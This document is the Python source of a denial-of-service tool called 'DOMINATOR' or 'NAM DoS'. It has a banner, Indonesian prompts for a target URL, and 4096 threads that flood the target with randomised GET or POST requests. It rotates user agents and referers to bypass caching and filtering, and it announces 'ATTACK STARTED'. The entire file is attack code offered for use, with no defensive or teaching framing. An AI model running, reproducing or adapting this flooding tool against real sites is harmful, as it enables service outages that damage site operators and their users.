import argparse
import random
import requests
import threading
import os
import signal
import sys
import queue

__version__ = "1.0.1"

accept_charset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

call_got_ok = 0
call_exit_on_err = 1
call_exit_on_too_many_files = 2
target_complete = 3

safe = False
headers_referers = [
    "http://www.google.com/?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://engadget.search.aol.com/search?q=",
]
headers_useragents = [
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
]
cur = 0

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def signal_handler(sig, frame):
    print("\n-- Interrupted by user --")
    sys.exit(0)

def httpcall(url, host, data, headers, response_channel):
    global cur
    cur += 1

    param_joiner = "&" if "?" in url else "?"

    while True:
        try:
            if data == "":
                q = requests.get(url + param_joiner + buildblock(random.randint(3, 9)) + "=" + buildblock(random.randint(3, 9)))
            else:
                q = requests.post(url, data=data)

            q.headers['User -Agent'] = random.choice(headers_useragents)
            q.headers['Cache-Control'] = 'no-cache'
            q.headers['Accept-Charset'] = accept_charset
            q.headers['Referer'] = random.choice(headers_referers) + buildblock(random.randint(5, 10))
            q.headers['Keep-Alive'] = str(random.randint(100, 110))
            q.headers['Connection'] = 'keep-alive'
            q.headers['Host'] = host

            for element in headers:
                key, value = element.split(':', 1)
                q.headers[key.strip()] = value.strip()

            q.raise_for_status()
            response_channel.put(call_got_ok)
        except requests.exceptions.RequestException as e:
            print(e)
            if "too many open files" in str(e):
                response_channel.put(call_exit_on_too_many_files)
                return
            response_channel.put(call_exit_on_err)
            return
        finally:
            cur -= 1

def buildblock(size):
    return ''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ') for _ in range(size))

os.system('clear')
def banner():
	
    print(Colors.OKGREEN + "  ██████╗  ██████╗ ███████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗" + Colors.ENDC)
    print(Colors.OKGREEN + "  ██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝" + Colors.ENDC)
    print(Colors.OKGREEN + "  ██║  ██║██║   ██║███████╗   ██║   ██║   ██║██║   ██║██║     ███████╗" + Colors.ENDC)
    print(Colors.OKGREEN + "  ██║  ██║██║   ██║╚════██║   ██║   ██║   ██║██║   ██║██║     ╚════██║" + Colors.ENDC)
    print(Colors.OKGREEN + "  ██████╔╝╚██████╔╝███████║   ██║   ╚██████╔╝╚██████╔╝███████╗███████║" + Colors.ENDC)
    print(Colors.OKGREEN + "  ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝" + Colors.ENDC)
    print(Colors.OKGREEN + "  TOOLS NAME: DOMINATOR V.1" + Colors.ENDC)
    print(Colors.OKGREEN + "  CODE ETERNAL ROOT LEAKD" + Colors.ENDC)
    print(Colors.OKCYAN + "                                              " + Colors.ENDC)

def main():
    global safe
    banner()
    
    parser = argparse.ArgumentParser(description='NAM DoS Tool in Python')
    parser.add_argument('--version', action='store_true', help='print version and exit')
    parser.add_argument('--safe', action='store_true', help='Autoshut after DoS.')
    parser.add_argument('--site', help='Destination site. If not provided, will prompt for input.')
    parser.add_argument('--agents', help='Get the list of user-agent lines from a file.')
    parser.add_argument('--data', help='Data to POST. If present, will use POST requests instead of GET.')
    parser.add_argument('--header', action='append', help='Add headers to the request. Can be used multiple times.')

    args = parser.parse_args()

    if args.version:
        print(Colors.OKBLUE + "NAMDoS " + __version__ + Colors.ENDC)
        sys.exit(0)

    safe = args.safe
    site = args.site
    data = args.data
    headers = args.header if args.header else []


    if not site:
        site = input(Colors.WARNING + "  MASUKAN URL TARGET: " + Colors.ENDC)

    if args.agents:
        try:
            with open(args.agents, 'r') as f:
                global headers_useragents
                headers_useragents = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(Colors.FAIL + f"Can't load User-Agent list from {args.agents}: {e}" + Colors.ENDC)
            sys.exit(1)

    print(Colors.OKCYAN + "--RidDoS ATTACK STARTED! --\n           Go!\n\n" + Colors.ENDC)
    response_channel = queue.Queue()
    threads = []

    for _ in range(4096):  # maxproc
        t = threading.Thread(target=httpcall, args=(site, site.split("//")[-1], data, headers, response_channel))
        t.start()
        threads.append(t)

    while True:
        response = response_channel.get()
        if response == call_exit_on_err:
            print(Colors.FAIL + "Error occurred." + Colors.ENDC)
        elif response == call_exit_on_too_many_files:
            print(Colors.FAIL + "Too many open files." + Colors.ENDC)
        elif response == call_got_ok:
            print(Colors.OKGREEN + "Request sent successfully." + Colors.ENDC)
        if safe and response == call_got_ok:
            print(Colors.OKCYAN + "-- RidDoS Attack Finished --" + Colors.ENDC)
            break

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    main()